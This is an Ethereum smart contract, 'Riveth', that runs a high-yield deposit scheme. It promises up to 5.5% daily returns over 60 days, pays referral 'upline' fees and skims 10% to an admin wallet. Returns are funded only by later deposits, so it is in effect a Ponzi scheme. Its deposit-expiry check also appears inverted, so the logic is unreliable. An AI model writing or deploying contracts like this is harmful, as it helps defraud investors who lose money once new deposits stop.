pragma solidity ^0.4.24;


library SafeMath {

  /**
  * @dev Multiplies two numbers, reverts on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  /**
  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

  /**
  * @dev Adds two numbers, reverts on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }

  /**
  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
  * reverts when dividing by zero.
  */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

library AddressUtils {
    function isContract(address _addr) internal view returns (bool) {
        uint256 size;
        assembly {size := extcodesize(_addr)}
        return size > 0;
    }
}

library Helpers {
    function walletFromData(bytes data) internal pure returns (address wallet) {
        assembly {
            wallet := mload(add(data, 20))
        }
    }
}

contract Riveth {
    using SafeMath for uint256;
    using AddressUtils for address;

    address public adminWallet;

    uint256 constant public DEPOSIT_MIN = 10 finney;
    uint256 constant public DEPOSIT_MAX = 50 ether;
    uint256 constant public DEPOSIT_PERIOD = 60 days;
    uint256 constant public DEPOSIT_COUNT_LIMIT = 5;
    uint256 constant public TOTAL_BASE_PERCENT = 120;
    uint256 constant public UPLINE_BASE_PERCENT = 5;
    uint256 constant public UPLINE_MIN_DEPOSIT = 10 finney;
    uint256 constant public EXPENSES_PERCENT = 10;

    uint256 public totalDeposited = 0;
    uint256 public totalWithdrawn = 0;
    uint256 public usersCount = 0;
    uint256 public depositsCount = 0;

    mapping(address => User) public users;
    mapping(uint256 => Deposit) public deposits;

    struct Deposit {
        uint256 createdAt;
        uint256 endAt;
        uint256 amount;
        uint256 accrued;
        bool active;
    }

    struct User {
        uint256 createdAt;
        address upline;
        uint256 totalDeposited;
        uint256 totalWithdrawn;
        uint256 activeDepositsCount;
        uint256 activeDepositsAmount;
        uint256[] deposits;
    }

    modifier onlyAdmin() {
        require(msg.sender == adminWallet);
        _;
    }

    constructor() public {
        adminWallet = msg.sender;
        createUser(msg.sender, address(0));
    }

    function createUser(address wallet, address upline) internal {
        users[wallet] = User({
            createdAt : now,
            upline : upline,
            totalDeposited : 0,
            totalWithdrawn : 0,
            activeDepositsCount : 0,
            activeDepositsAmount : 0,
            deposits : new uint256[](0)
            });
        usersCount++;
    }

    function createDeposit() internal {
        User storage user = users[msg.sender];
        uint256 amount = msg.value;

        Deposit memory deposit = Deposit({
            createdAt : now,
            endAt : now.add(DEPOSIT_PERIOD),
            amount : amount,
            accrued : 0,
            active : true
        });

        deposits[depositsCount] = deposit;
        user.deposits.push(depositsCount);

        user.totalDeposited = user.totalDeposited.add(amount);
        totalDeposited = amount.add(totalDeposited);

        depositsCount++;
        user.activeDepositsCount++;
        user.activeDepositsAmount = user.activeDepositsAmount.add(amount);

        adminWallet.transfer(amount.mul(EXPENSES_PERCENT).div(100));

        uint256 uplineFee = amount.mul(UPLINE_BASE_PERCENT).div(100);
        transferUplineFee(uplineFee);
    }

    function transferUplineFee(uint256 amount) internal {
        User storage user = users[msg.sender];
        
        if (user.upline != address(0)) {
            user.upline.transfer(amount);
        }
    }

    function getUpline() internal view returns (address){
        address uplineWallet = Helpers.walletFromData(msg.data);

        return users[uplineWallet].createdAt > 0 
        && users[uplineWallet].totalDeposited >= UPLINE_MIN_DEPOSIT 
        && msg.sender != uplineWallet
        ? uplineWallet
        : adminWallet;
    }

    function() payable public {
        require(msg.sender != address(0), 'Address incorrect');
        require(!msg.sender.isContract(), 'Address is contract');
        require(msg.value <= DEPOSIT_MAX, 'Amount too big');

        User storage user = users[msg.sender];

        if (user.createdAt == 0) {
            createUser(msg.sender, getUpline());
        }

        if (msg.value >= DEPOSIT_MIN) {
            require(user.activeDepositsCount < DEPOSIT_COUNT_LIMIT, 'Active deposits count limit');
            createDeposit();
        } else {
            accrueDeposits();
        }
    }

    function accrueDeposits() internal {
        User storage user = users[msg.sender];

        for (uint i = 0; i < user.deposits.length; i++) {
            if(deposits[user.deposits[i]].active){
                accrueDeposits(user.deposits[i]);
            }
        }
    }

    function accrueDeposits(uint256 depositId) internal {
        User storage user = users[msg.sender];
        Deposit storage deposit = deposits[depositId];
        uint256 amount = getAccrualAmount(depositId);

        withdraw(msg.sender, amount);

        deposit.accrued = deposit.accrued.add(amount);

        if (deposit.endAt >= now) {
            deposit.active = false;
            user.activeDepositsCount--;
            user.activeDepositsAmount = user.activeDepositsAmount.sub(deposit.amount);
        }
    }

    function getAccrualAmount(uint256 depositId) internal view returns (uint256){
        Deposit storage deposit = deposits[depositId];
        uint256 totalProfit = totalForAccrual(msg.sender, depositId);
        uint256 amount = totalProfit
        .mul(
            now.sub(deposit.createdAt)
        )
        .div(DEPOSIT_PERIOD)
        .sub(deposit.accrued);

        if (amount.add(deposit.accrued) > totalProfit) {
            amount = totalProfit.sub(deposit.accrued);
        }
        return amount;
    }


    function withdraw(address wallet, uint256 amount) internal {
        wallet.transfer(amount);
        totalWithdrawn = totalWithdrawn.add(amount);
        users[wallet].totalWithdrawn = users[wallet].totalWithdrawn.add(amount);
    }

    function getUserDeposits(address _address) public view returns (uint256[]){
        return users[_address].deposits;
    }

    function getGlobalPercent() public view returns (uint256){
        uint256 balance = address(this).balance;
        if(balance >= 5000 ether){
            //5.5% daily
            return 330;
        }
        if(balance >= 3000 ether){
            //5% daily
            return 300;
        }
        if(balance >= 1000 ether){
            //4.5% daily
            return 270;
        }
        if(balance >= 500 ether){
            //4% daily
            return 240;
        }
        if(balance >= 200 ether){
            //3.5% daily
            return 210;
        }
        if(balance >= 100 ether){
            //3% daily
            return 180;
        }
        if(balance >= 50 ether){
            //2.5% daily
            return 150;
        }
        return TOTAL_BASE_PERCENT;
    }

    function getLocalPercent() public view returns (uint256){
        return getLocalPercent(msg.sender);
    }

    function getLocalPercent(address user) public view returns (uint256){
        uint256 activeDepositsAmount = users[user].activeDepositsAmount;
        if(activeDepositsAmount >= 250 ether){
            //5.5% daily
            return 330;
        }
        if(activeDepositsAmount >= 150 ether){
            //5% daily
            return 300;
        }
        if(activeDepositsAmount >= 50 ether){
            //4.5% daily
            return 270;
        }
        if(activeDepositsAmount >= 25 ether){
            //4% daily
            return 240;
        }
        if(activeDepositsAmount >= 10 ether){
            //3.5% daily
            return 210;
        }
        if(activeDepositsAmount >= 5 ether){
            //3% daily
            return 180;
        }
        if(activeDepositsAmount >= 3 ether){
            //2.5% daily
            return 150;
        }

        return TOTAL_BASE_PERCENT;
    }

    function getIndividualPercent() public view returns (uint256){
        return getIndividualPercent(msg.sender);
    }

    function getIndividualPercent(address user) public view returns (uint256){
        uint256 globalPercent = getGlobalPercent();
        uint256 localPercent = getLocalPercent(user);
        return globalPercent >= localPercent ? globalPercent : localPercent;
    }
    
    function totalForAccrual(address user, uint256 depositId) public view returns (uint256){
        return deposits[depositId].amount.mul(getIndividualPercent(user)).div(100);
    }
}